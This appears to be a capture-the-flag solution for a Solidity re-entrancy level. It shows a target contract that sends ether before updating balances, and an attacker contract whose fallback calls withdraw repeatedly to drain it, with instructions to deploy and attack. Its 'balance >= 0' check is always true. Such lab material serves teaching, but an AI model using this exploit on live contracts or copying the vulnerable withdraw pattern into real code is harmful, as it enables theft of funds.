# Re-entrancy

**HINT:** Look at the order of the Withdraw function (CHECKS -> INTERACTION -> EFFECTS)
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.4;



contract Reentrance {
  

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}


contract Reenter {
    Reentrance reentranceContract;
    uint public amount = 1 ether;    
    
    constructor(address payable reentranceContactAddress) public payable {
        reentranceContract = Reentrance(reentranceContactAddress);
    }

function initiateAttack() public {
    reentranceContract.donate{value:amount}(address(this));
    reentranceContract.withdraw(amount); 
  }
  
  fallback() external payable {
    if (address(reentranceContract).balance >= 0 ) {
        reentranceContract.withdraw(amount); 
    }
   }
}
```
add your instance address and deploy with 1 ether then attack
</p>
</details>
